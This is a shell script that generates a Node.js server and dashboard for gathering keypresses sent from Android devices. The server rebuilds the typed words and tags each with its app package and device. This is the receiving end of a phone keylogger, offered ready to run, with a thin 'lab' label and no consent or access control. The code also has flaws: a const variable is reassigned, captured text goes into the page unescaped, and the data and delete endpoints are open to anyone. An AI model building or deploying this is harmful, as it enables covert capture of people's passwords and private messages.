#!/bin/bash

# Enhanced Lab Log Server Generator
# - Stores raw keypresses and reconstructed words
# - Device filtering API
# - Clean dashboard

echo "[+] Creating enhanced server files..."

# Create public directory
mkdir -p public

# ---------- package.json ----------
cat > package.json <<'EOF'
{
  "name": "android-log-server",
  "version": "2.0.0",
  "description": "Enhanced lab log server with word reconstruction",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.19.2",
    "socket.io": "^4.7.5"
  }
}
EOF

# ---------- server.js ----------
cat > server.js <<'EOF'
const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'logs.json');
const WORDS_FILE = path.join(__dirname, 'words.json');

// In-memory storage
let logs = [];
let words = [];

// Current word being typed per device
let currentWords = new Map(); // device -> { text, lastKeyTime, package }

// Load existing data
function loadFromFile(file, array) {
  if (fs.existsSync(file)) {
    try {
      const raw = fs.readFileSync(file, 'utf8');
      array.push(...raw.split('\n').filter(l => l.trim()).map(l => JSON.parse(l)));
    } catch (e) { console.error(`Failed to load ${file}:`, e.message); }
  }
}
loadFromFile(LOG_FILE, logs);
loadFromFile(WORDS_FILE, words);

function appendToFile(file, entry) {
  fs.appendFile(file, JSON.stringify(entry) + '\n', err => {
    if (err) console.error(`Failed to write ${file}:`, err.message);
  });
}

// --- Middleware ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// --- Helper: complete current word for a device ---
function completeWord(device, force = false) {
  const cw = currentWords.get(device);
  if (!cw) return;
  if (cw.text.length > 0 && (force || Date.now() - cw.lastKeyTime > 3000)) {
    const wordEntry = {
      device: device,
      word: cw.text,
      package: cw.package,
      timestamp: cw.lastKeyTime,
      completedAt: new Date().toISOString()
    };
    words.push(wordEntry);
    appendToFile(WORDS_FILE, wordEntry);
    io.emit('newWord', wordEntry);
    cw.text = '';
  }
}

// --- POST /log ---
app.post('/log', (req, res) => {
  const entry = {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    body: req.body
  };
  logs.push(entry);
  appendToFile(LOG_FILE, entry);
  io.emit('newLog', entry);

  // Word reconstruction
  const { device, event, key, package: pkg } = req.body || {};
  if (device && event === 'keypress' && key) {
    // Ensure current word object exists
    if (!currentWords.has(device)) {
      currentWords.set(device, { text: '', lastKeyTime: Date.now(), package: pkg || 'unknown' });
    }
    const cw = currentWords.get(device);

    // Update package if provided
    if (pkg) cw.package = pkg;

    // Handle keys
    if (key === 'BACKSPACE') {
      cw.text = cw.text.slice(0, -1);
    } else if (key === 'ENTER') {
      completeWord(device, true);
    } else if (key === ' ') {
      // Space is a word separator
      completeWord(device, true);
    } else {
      // Regular character
      // Check time gap for new word
      if (cw.text.length > 0 && Date.now() - cw.lastKeyTime > 3000) {
        completeWord(device, true);
        // Reset current word object after completion
        currentWords.set(device, { text: '', lastKeyTime: Date.now(), package: cw.package });
        cw = currentWords.get(device);
      }
      cw.text += key;
    }
    cw.lastKeyTime = Date.now();
  }

  res.status(200).json({ status: 'ok' });
});

// --- GET /api/logs ---
app.get('/api/logs', (req, res) => {
  const device = req.query.device;
  if (device) {
    return res.json(logs.filter(l => l.body && l.body.device === device));
  }
  res.json(logs);
});

// --- GET /api/words ---
app.get('/api/words', (req, res) => {
  const device = req.query.device;
  if (device) {
    return res.json(words.filter(w => w.device === device));
  }
  res.json(words);
});

// --- GET /api/devices ---
app.get('/api/devices', (req, res) => {
  const deviceSet = new Set();
  logs.forEach(l => {
    if (l.body && l.body.device) deviceSet.add(l.body.device);
  });
  words.forEach(w => deviceSet.add(w.device));
  const devices = Array.from(deviceSet).map(d => ({
    device: d,
    logCount: logs.filter(l => l.body && l.body.device === d).length,
    wordCount: words.filter(w => w.device === d).length
  }));
  res.json(devices);
});

// --- DELETE /api/logs ---
app.delete('/api/logs', (req, res) => {
  logs = [];
  words = [];
  currentWords.clear();
  fs.writeFile(LOG_FILE, '', () => {});
  fs.writeFile(WORDS_FILE, '', () => {});
  io.emit('logsCleared');
  res.status(200).json({ status: 'cleared' });
});

// --- Start server ---
server.listen(PORT, () => {
  console.log(`Log server running at http://localhost:${PORT}`);
  console.log(`API endpoints:`);
  console.log(`  POST /log           - receive keypress`);
  console.log(`  GET  /api/devices   - list devices`);
  console.log(`  GET  /api/logs?device=XXX - get logs`);
  console.log(`  GET  /api/words?device=XXX - get reconstructed words`);
});
EOF

# ---------- public/index.html ----------
cat > public/index.html <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
    h1 { color: #333; }
    .controls { display: flex; align-items: center; margin-bottom: 15px; }
    .controls label { margin-right: 10px; font-weight: bold; }
    select, button { padding: 6px 12px; margin-right: 10px; }
    .section { background: #fff; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 20px; }
    .section h2 { margin: 0; padding: 10px; background: #f0f0f0; border-bottom: 1px solid #ddd; font-size: 18px; }
    .section-content { padding: 10px; max-height: 400px; overflow-y: auto; }
    .log-entry, .word-entry { border-bottom: 1px solid #eee; padding: 6px 0; font-size: 14px; }
    .log-time { color: #777; margin-right: 8px; }
    .log-ip { color: #999; margin-right: 8px; }
    .device-highlight { color: #0066cc; font-weight: bold; }
    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>
  <h1>Android Log Dashboard</h1>
  <div class="controls">
    <label for="deviceSelect">Filter by device:</label>
    <select id="deviceSelect">
      <option value="">All devices</option>
    </select>
    <button onclick="clearLogs()">Clear All Data</button>
  </div>

  <div class="section">
    <h2>Reconstructed Words</h2>
    <div id="wordsContainer" class="section-content"></div>
  </div>

  <div class="section">
    <h2>Raw Keypress Logs</h2>
    <div id="logsContainer" class="section-content"></div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const deviceSelect = document.getElementById('deviceSelect');
    const logsContainer = document.getElementById('logsContainer');
    const wordsContainer = document.getElementById('wordsContainer');

    // Load devices
    function loadDevices() {
      fetch('/api/devices')
        .then(r => r.json())
        .then(devices => {
          const current = deviceSelect.value;
          deviceSelect.innerHTML = '<option value="">All devices</option>';
          devices.forEach(d => {
            const opt = document.createElement('option');
            opt.value = d.device;
            opt.textContent = `${d.device} (${d.logCount} logs, ${d.wordCount} words)`;
            deviceSelect.appendChild(opt);
          });
          deviceSelect.value = current;
        })
        .catch(e => console.error('Failed to load devices:', e));
    }

    // Load data based on selected device
    function loadData() {
      const device = deviceSelect.value;
      const logUrl = device ? `/api/logs?device=${encodeURIComponent(device)}` : '/api/logs';
      const wordUrl = device ? `/api/words?device=${encodeURIComponent(device)}` : '/api/words';

      fetch(logUrl)
        .then(r => r.json())
        .then(logs => {
          logsContainer.innerHTML = '';
          logs.forEach(entry => addLogEntry(entry, false));
        });

      fetch(wordUrl)
        .then(r => r.json())
        .then(words => {
          wordsContainer.innerHTML = '';
          words.forEach(word => addWordEntry(word));
        });
    }

    // Add a log entry to DOM
    function addLogEntry(entry, prepend = true) {
      const div = document.createElement('div');
      div.className = 'log-entry';
      const device = entry.body && entry.body.device ? entry.body.device : 'unknown';
      const key = entry.body && entry.body.key ? entry.body.key : '';
      const pkg = entry.body && entry.body.package ? entry.body.package : '';
      div.innerHTML = `
        <span class="log-time">${entry.timestamp}</span>
        <span class="log-ip">${entry.ip}</span>
        <span class="device-highlight">${device}</span> : ${key} <span style="color:#666">[${pkg}]</span>
      `;
      if (prepend) logsContainer.prepend(div); else logsContainer.appendChild(div);
    }

    // Add a word entry to DOM
    function addWordEntry(word) {
      const div = document.createElement('div');
      div.className = 'word-entry';
      div.innerHTML = `
        <span class="log-time">${word.completedAt}</span>
        <span class="device-highlight">${word.device}</span> : <strong>${word.word}</strong> <span style="color:#666">[${word.package}]</span>
      `;
      wordsContainer.prepend(div);
    }

    // Clear all data
    function clearLogs() {
      if (!confirm('Clear all logs and words?')) return;
      fetch('/api/logs', { method: 'DELETE' })
        .then(() => {
          logsContainer.innerHTML = '';
          wordsContainer.innerHTML = '';
          loadDevices();
        });
    }

    // Real-time updates
    const socket = io();
    socket.on('newLog', (entry) => {
      const currentDevice = deviceSelect.value;
      if (!currentDevice || (entry.body && entry.body.device === currentDevice)) {
        addLogEntry(entry, true);
      }
      loadDevices(); // refresh counts
    });

    socket.on('newWord', (word) => {
      const currentDevice = deviceSelect.value;
      if (!currentDevice || word.device === currentDevice) {
        addWordEntry(word);
      }
      loadDevices();
    });

    socket.on('logsCleared', () => {
      logsContainer.innerHTML = '';
      wordsContainer.innerHTML = '';
      loadDevices();
    });

    // Event listeners
    deviceSelect.addEventListener('change', loadData);

    // Initial load
    loadDevices();
    loadData();
  </script>
</body>
</html>
EOF

echo "[+] Enhanced server files created successfully."
echo "Now run: npm install && npm start"
